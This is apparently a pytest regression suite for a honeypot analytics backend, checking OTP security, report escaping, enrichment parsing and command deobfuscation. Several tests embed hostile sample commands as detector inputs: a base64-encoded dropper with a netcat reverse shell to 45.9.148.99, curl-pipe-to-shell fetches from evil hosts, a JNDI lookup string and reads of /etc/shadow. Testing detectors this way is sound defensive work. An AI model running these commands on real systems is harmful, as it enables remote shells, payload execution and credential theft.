"""Regression tests, one per defect found during the review."""

import json

import pytest

from app.models import UserRole


class TestRoutingAndResponses:
    async def test_alert_stats_is_not_shadowed_by_alert_id(
        self, client, auth_headers
    ):
        """/alerts/stats used to match /alerts/{alert_id:int} and 422."""
        headers = await auth_headers(UserRole.ANALYST)
        response = await client.get("/api/v1/alerts/stats", headers=headers)
        assert response.status_code == 200
        assert set(response.json()) >= {"new", "acknowledged", "resolved"}

    async def test_health_endpoint_needs_no_query_parameter(self, client):
        """`request` lacked a Request annotation, so /health returned 422."""
        response = await client.get("/health")
        assert response.status_code == 200
        assert response.json()["status"] == "healthy"

    async def test_security_headers_present(self, client):
        response = await client.get("/health")
        assert response.headers["X-Content-Type-Options"] == "nosniff"
        assert response.headers["X-Frame-Options"] == "DENY"


class TestExport:
    async def test_json_export_does_not_raise_unbound_local(
        self, client, auth_headers
    ):
        """`import json` inside a branch made `json` function-local, so the
        default JSON branch raised UnboundLocalError before its own import."""
        headers = await auth_headers(UserRole.ANALYST)
        response = await client.post("/api/v1/export/?format=json", headers=headers)
        assert response.status_code == 200
        assert json.loads(response.text) == []

    @pytest.mark.parametrize("fmt", ["json", "cef", "stix"])
    async def test_every_format_renders(self, client, auth_headers, fmt):
        headers = await auth_headers(UserRole.ANALYST)
        response = await client.post(
            f"/api/v1/export/?format={fmt}", headers=headers
        )
        assert response.status_code == 200

    async def test_unknown_format_rejected(self, client, auth_headers):
        headers = await auth_headers(UserRole.ANALYST)
        response = await client.post(
            "/api/v1/export/?format=yaml", headers=headers
        )
        assert response.status_code == 422


class TestFilterValidation:
    async def test_unknown_enum_filter_is_400_not_500(
        self, client, auth_headers
    ):
        headers = await auth_headers(UserRole.ANALYST)
        response = await client.get(
            "/api/v1/sessions/?status=not-a-status", headers=headers
        )
        assert response.status_code == 400
        assert "Expected one of" in response.json()["detail"]

    async def test_like_wildcards_in_search_are_escaped(
        self, client, auth_headers
    ):
        headers = await auth_headers(UserRole.ANALYST)
        response = await client.get("/api/v1/sessions/?search=%25", headers=headers)
        assert response.status_code == 200


class TestHoneypotIngest:
    async def test_ingest_requires_the_shared_token(self, client):
        response = await client.post(
            "/api/v1/sessions/ingest-internal?node_id=1", json={}
        )
        assert response.status_code == 401

    async def test_ingest_rejects_a_wrong_token(self, client):
        response = await client.post(
            "/api/v1/sessions/ingest-internal?node_id=1",
            json={},
            headers={"X-Honeypot-Token": "not-the-token"},
        )
        assert response.status_code == 401


class TestOTP:
    async def test_codes_are_not_stored_in_plaintext(self, db_session, make_user):
        from sqlalchemy import select

        from app.models import OTPVerification
        from app.services.otp import otp_service

        user = await make_user(email="otp@example.com")
        with pytest.MonkeyPatch.context() as mp:
            mp.setattr(
                "app.services.email.email_service.send_otp_email",
                lambda *a, **k: True,
            )
            await otp_service.generate_and_send(db_session, user)

        record = (
            await db_session.execute(
                select(OTPVerification).where(OTPVerification.user_id == user.id)
            )
        ).scalar_one()
        assert len(record.otp_code) == 64
        assert not record.otp_code.isdigit()

    async def test_attempts_are_limited(self, db_session, make_user):
        from app.services.otp import OTP_MAX_ATTEMPTS, otp_service

        user = await make_user(email="brute@example.com")
        with pytest.MonkeyPatch.context() as mp:
            mp.setattr(
                "app.services.email.email_service.send_otp_email",
                lambda *a, **k: True,
            )
            await otp_service.generate_and_send(db_session, user)

        for _ in range(OTP_MAX_ATTEMPTS):
            result = await otp_service.verify(db_session, user.id, "000000")
            assert result["valid"] is False

        # OTP_MAX_ATTEMPTS was defined but never enforced, so codes could be
        # brute-forced indefinitely.
        final = await otp_service.verify(db_session, user.id, "000000")
        assert "Too many" in final["reason"]

    def test_codes_use_a_cryptographic_rng(self):
        from app.services.otp import OTPService

        codes = {OTPService._generate_code() for _ in range(200)}
        assert all(len(c) == 6 and c.isdigit() for c in codes)
        assert len(codes) > 150  # not obviously degenerate


class TestReportEscaping:
    def test_cef_extension_values_are_escaped(self):
        from app.services.report_generator import report_generator

        line = report_generator.generate_cef_report(
            {
                "attacker_ip": "1.2.3.4",
                "session_uuid": "abc",
                "protocol": "ssh",
                "geo": {},
            },
            {"category": "exploitation", "detected_tools": ["evil=injected"]},
        )
        # The injected '=' must be escaped so it cannot forge a new CEF field.
        assert "evil\\=injected" in line

    def test_stix_pattern_quotes_are_escaped(self):
        from app.services.report_generator import report_generator

        bundle = report_generator.generate_stix_report(
            {"attacker_ip": "1.2.3.4", "session_uuid": "s"},
            {"category": "recon", "detected_tools": ["it's"], "mitre": {}},
        )
        parsed = json.loads(bundle)
        patterns = [
            o["pattern"] for o in parsed["objects"] if o["type"] == "indicator"
        ]
        assert any("it\\'s" in p for p in patterns)

    def test_invalid_technique_ids_are_dropped(self):
        from app.services.report_generator import report_generator

        bundle = json.loads(
            report_generator.generate_stix_report(
                {"attacker_ip": "1.2.3.4", "session_uuid": "s"},
                {
                    "category": "recon",
                    "mitre": {"techniques": [{"id": "NOT-A-TECHNIQUE", "name": "x"}]},
                },
            )
        )
        assert not [
            o for o in bundle["objects"] if o["type"] == "attack-pattern"
        ]


class TestAlertEmailEscaping:
    def test_attacker_controlled_values_are_escaped(self):
        from app.services.alerting import alerting_service

        body = alerting_service._format_email_body(
            {
                "severity": "critical",
                "title": "<script>alert(1)</script>",
                "attacker_ip": "1.2.3.4",
            }
        )
        assert "<script>" not in body
        assert "&lt;script&gt;" in body


class TestGeoIP:
    def test_missing_database_returns_unknown_not_fabricated_data(self):
        """The fallback used to derive a country from an MD5 of the IP."""
        from app.services.geoip import geoip_service

        result = geoip_service.lookup("8.8.8.8")
        assert result["country"] is None
        assert result["lat"] is None
        assert result["source"] == "unavailable"

    def test_private_addresses_are_labelled(self):
        from app.services.geoip import geoip_service

        assert geoip_service.lookup("10.0.0.5")["source"] == "private_address"


class TestEncryption:
    def test_round_trip(self):
        from app.core.encryption import decrypt_data, encrypt_data

        assert decrypt_data(encrypt_data("cat /etc/shadow")) == "cat /etc/shadow"

    def test_corrupt_ciphertext_raises_value_error(self):
        from app.core.encryption import decrypt_data

        with pytest.raises(ValueError):
            decrypt_data("not-a-valid-token")


class TestClassifierFeatures:
    FLOW = {
        "duration": 10.0, "fwd_packets": 5, "fwd_bytes": 500, "bwd_bytes": 1500,
        "fwd_max": 200, "bwd_max": 900, "fwd_iat_mean": 2.0, "fwd_iat_max": 4.0,
        "flow_iat_max": 5.0,
    }

    def test_engine_flow_becomes_the_shared_feature_vector(self):
        from app.ai.classifier import FeatureExtractor

        vector = FeatureExtractor.extract_from_flow(self.FLOW, "ssh")
        assert vector.shape == (1, len(FeatureExtractor.FEATURES))
        row = dict(zip(FeatureExtractor.FEATURES, vector[0]))
        assert row["destination_port"] == 22
        assert row["flow_bytes_per_second"] == 200.0
        assert row["bwd_fwd_byte_ratio"] == 3.0
        assert row["flow_iat_max"] == 5.0

    def test_session_without_telemetry_rests_on_the_service_alone(self):
        from app.ai.classifier import FeatureExtractor

        row = FeatureExtractor.extract_from_flow(None, "ftp")[0]
        assert row[0] == 21 and not row[1:].any()

    def test_verdicts_declare_their_model_provenance(self):
        from app.ai.classifier import classifier

        result = classifier.classify_flow(self.FLOW, "http")
        assert result["model_source"] in ("synthetic", "pretrained", "cicids2017")

    def test_artefact_for_another_feature_layout_is_refused(self, tmp_path, monkeypatch):
        import pickle

        from app.ai import classifier as module

        path = tmp_path / "rf.pkl"
        with open(path, "wb") as fh:
            pickle.dump({"model": object(), "label_encoder": object(),
                         "source": "cicids2017", "features": ["old"] * 36}, fh)
        monkeypatch.setattr(module.settings, "MODEL_PATH_RF", str(path))
        fresh = module.AttackClassifier()
        result = fresh.classify_flow(self.FLOW, "ssh")
        assert result["model_source"] == "synthetic"


class TestNLPEngine:
    def test_analysis_works_without_the_spacy_model(self):
        """analyze_commands called self.nlp without ever loading it, so every
        ingest raised "NoneType is not callable"."""
        from app.ai.nlp_engine import nlp_engine

        result = nlp_engine.analyze_commands(
            ["nmap -sS 10.0.0.1", "wget http://evil.example/x.sh -O /tmp/x"]
        )
        assert "nmap" in result["tool_names"]
        assert "10.0.0.1" in result["extracted_ips"]
        assert result["extracted_urls"]

    def test_payload_analysis_does_not_crash(self):
        from app.ai.nlp_engine import nlp_engine

        result = nlp_engine.analyze_payload("${jndi:ldap://x/a} union select")
        assert 0.0 <= result["suspicion_score"] <= 1.0


class TestSettingsParsing:
    """CORS_ORIGINS arrives as a comma-separated environment variable.

    pydantic-settings classifies List[str] as a complex type and runs
    json.loads on the raw value before any validator runs, so the documented
    comma-separated form raised SettingsError at import and the process died
    during startup:

        pydantic_settings.sources.SettingsError: error parsing value for
        field "CORS_ORIGINS" from source "EnvSettingsSource"

    The field is annotated with NoDecode so _split_origins receives the raw
    string. These run in-process because the failure is at Settings
    construction, before anything else can be exercised.
    """

    @staticmethod
    def _settings(value):
        import os
        from unittest import mock

        from app.core.config import Settings

        with mock.patch.dict(os.environ, {"CORS_ORIGINS": value}, clear=False):
            return Settings()

    def test_single_origin(self):
        settings = self._settings("https://example.vercel.app")
        assert settings.CORS_ORIGINS == ["https://example.vercel.app"]

    def test_comma_separated_origins(self):
        settings = self._settings("https://a.example, https://b.example")
        assert settings.CORS_ORIGINS == ["https://a.example", "https://b.example"]

    def test_empty_value_yields_no_origins(self):
        assert self._settings("").CORS_ORIGINS == []

    def test_json_list_is_still_accepted(self):
        """The JSON form worked before NoDecode; it must keep working."""
        settings = self._settings('["https://a.example","https://b.example"]')
        assert settings.CORS_ORIGINS == ["https://a.example", "https://b.example"]


def test_enum_columns_persist_values_not_names():
    """Every enum column must store the member value, matching the migrations.

    SQLAlchemy's default is to store ``member.name`` (``ADMIN``), while every
    migration creates the Postgres type from lowercase values (``admin``).
    That mismatch made the deployed app unusable: registration was rejected by
    Postgres on every INSERT, and reading a row back raised LookupError, so
    both signup and login returned 500. Assert the two agree.
    """
    from app.models import Base

    checked = 0
    for table in Base.metadata.tables.values():
        for column in table.columns:
            enums = getattr(column.type, "enums", None)
            if not enums:
                continue
            python_enum = getattr(column.type, "enum_class", None)
            if python_enum is None:
                continue
            expected = [member.value for member in python_enum]
            assert enums == expected, (
                f"{table.name}.{column.name} would persist {enums}, but the "
                f"migration created the type with {expected}"
            )
            checked += 1

    assert checked >= 8, f"expected to check every enum column, saw {checked}"


def test_training_features_match_the_classifier():
    """The trainer and the classifier must agree on the feature vector.

    If these drift, the model is trained on one meaning of position N and
    applied to another. Nothing in the metrics would reveal it — the model
    would score well on its own split and be nonsense in production — so it is
    asserted here instead.
    """
    import pandas as pd

    from app.ai.classifier import FeatureExtractor
    from ml import cicids

    assert list(cicids.FEATURES) == list(FeatureExtractor.FEATURES)

    # CICFlowMeter's microseconds must arrive as the seconds the engine
    # measures; the first version of the loader skipped this conversion.
    raw = pd.DataFrame([{
        "port": 22, "duration_us": 10_000_000, "fwd_data_packets": 5,
        "fwd_bytes": 500, "bwd_bytes": 1500, "fwd_max": 200, "bwd_max": 900,
        "fwd_iat_mean_us": 2_000_000, "fwd_iat_max_us": 4_000_000,
        "flow_iat_max_us": 5_000_000,
    }])
    trained_on = cicids.features_from_frame(raw).to_numpy()[0]
    inferred_on = FeatureExtractor.extract_from_flow(TestClassifierFeatures.FLOW, "ssh")[0]
    assert list(trained_on) == list(inferred_on)


def test_obfuscated_payload_reaches_tool_detection():
    """A base64 dropper must be decoded before analysis, not just flagged.

    Section V.B.2 records the expert interviews requiring recursive decoding
    before TTP mapping. Previously `base64` was only a pattern to match on, so
    the command below was recorded as one opaque string and the C2 host inside
    it was never extracted as an indicator.
    """
    import base64

    from app.ai.nlp_engine import nlp_engine

    inner = "wget http://45.9.148.99/x.sh -O /tmp/x; chmod 777 /tmp/x; nc -e /bin/bash 45.9.148.99 4444"
    encoded = base64.b64encode(inner.encode()).decode()

    result = nlp_engine.analyze_commands([f"echo {encoded} | base64 -d | sh"])

    assert result["is_obfuscated"] is True
    assert result["deobfuscation"]["layer_count"] >= 1
    # The payload's own behaviour, recovered from inside the encoding.
    assert {"wget_curl", "netcat", "reverse_shell"} <= set(result["tool_names"])
    # And the C2 address, which is the durable indicator.
    assert "45.9.148.99" in result["extracted_ips"]


def test_deobfuscation_recurses_and_terminates():
    """Nested encodings unwrap; plain text produces no layers and no loop."""
    import base64

    from app.ai.deobfuscate import MAX_DEPTH, deobfuscate_commands

    inner = "curl http://evil.tld/stage2.sh | sh"
    once = base64.b64encode(inner.encode()).decode()
    twice = base64.b64encode(once.encode()).decode()

    nested = deobfuscate_commands([f"echo {twice} | base64 -d | base64 -d | sh"])
    assert nested.max_depth == 2
    assert any(inner in layer.decoded for layer in nested.layers)
    assert nested.max_depth <= MAX_DEPTH

    # No false positives on ordinary commands.
    plain = deobfuscate_commands(["ls -la", "whoami", "cat /etc/passwd"])
    assert plain.layers == []


def test_chimera_rejects_hallucinated_attack_ids():
    """Model output must not be able to inject a fake ATT&CK technique.

    The enrichment stage unions model techniques into the session's mapping.
    A hallucinated identifier reaching that mapping would put fabricated
    intelligence in an export that downstream tooling treats as authoritative,
    so anything not shaped like a real technique ID is dropped.
    """
    import json

    from app.ai.llm import ChimeraClient

    parsed = ChimeraClient._parse(json.dumps({
        "mitre_techniques": [
            {"id": "NOT-A-TECHNIQUE", "name": "made up"},
            {"id": "T1059.004", "name": "Unix Shell"},
            {"id": "T1105", "name": "Ingress Tool Transfer"},
        ],
    }))

    assert [t["id"] for t in parsed["mitre_techniques"]] == ["T1059.004", "T1105"]


def test_chimera_survives_reasoning_model_output():
    """Reasoning fine-tunes narrate and fence their JSON; both must parse."""
    import json

    from app.ai.llm import ChimeraClient

    payload = json.dumps({"intent": "drop a miner", "confidence": 0.7})

    for variant in (payload, f"```json\n{payload}\n```", f"Let me think.\n\n{payload}"):
        parsed = ChimeraClient._parse(variant)
        assert parsed is not None and parsed["intent"] == "drop a miner"

    # Confidence is clamped, not trusted.
    assert ChimeraClient._parse(json.dumps({"confidence": 47}))["confidence"] == 1.0
    assert ChimeraClient._parse("I cannot help with that.") is None


def test_enrichment_is_disabled_without_an_endpoint():
    """Absent configuration must leave ingest on the regex path, not fail it."""
    from app.ai.llm import ChimeraClient

    client = ChimeraClient()
    client._settings = type("S", (), {"CHIMERA_URL": ""})()
    assert client.enabled is False


def test_clusterer_reports_unfitted_rather_than_inventing_a_cluster():
    """No model must mean "no answer", not cluster 0 for every session.

    Section VI.B claims behavioural clustering; the code had a threshold
    scorecard named CLUSTER_RULES and no algorithm. Now that clustering is
    real, the failure mode to avoid is the project's recurring one — reporting
    a confident value that measures nothing.
    """
    import numpy as np

    from app.ai.clustering import MIN_SESSIONS_TO_FIT, BehaviouralClusterer

    fresh = BehaviouralClusterer()
    fresh._loaded = True  # skip disk load
    result = fresh.assign(np.zeros(10))

    assert result["fitted"] is False
    assert result["cluster"] is None

    with pytest.raises(ValueError, match="at least"):
        fresh.fit(np.random.rand(MIN_SESSIONS_TO_FIT - 1, 10))


def test_like_escaping_is_single_backslash():
    """One implementation, and it escapes a single backslash, not a doubled one.

    `iocs.py` carried its own copy that replaced the two-character sequence
    `\\` and handed `ilike` a two-character escape. SQLAlchemy wants exactly
    one character there.
    """
    from app.core.sql import LIKE_ESCAPE, escape_like

    assert len(LIKE_ESCAPE) == 1
    assert escape_like("100%_literal") == r"100\%\_literal"
    assert escape_like("a\\b") == "a\\\\b"
    assert escape_like("plain") == "plain"
    # Backslashes are doubled first, or they would escape the escapes.
    assert escape_like("\\%") == "\\\\\\%"


def test_backend_parses_on_python_3_11():
    """A backslash in an f-string expression is a syntax error before 3.12.

    One such line in `iocs.py` made the whole suite unrunnable on 3.11 with an
    error pointing nowhere near the tests.
    """
    import ast
    import pathlib

    root = pathlib.Path(__file__).resolve().parents[1]
    failures = []
    for path in sorted(root.rglob("*.py")):
        try:
            ast.parse(path.read_text(), feature_version=(3, 11))
        except SyntaxError as exc:
            failures.append(f"{path.relative_to(root)}:{exc.lineno}: {exc.msg}")
    assert not failures, "\n".join(failures)
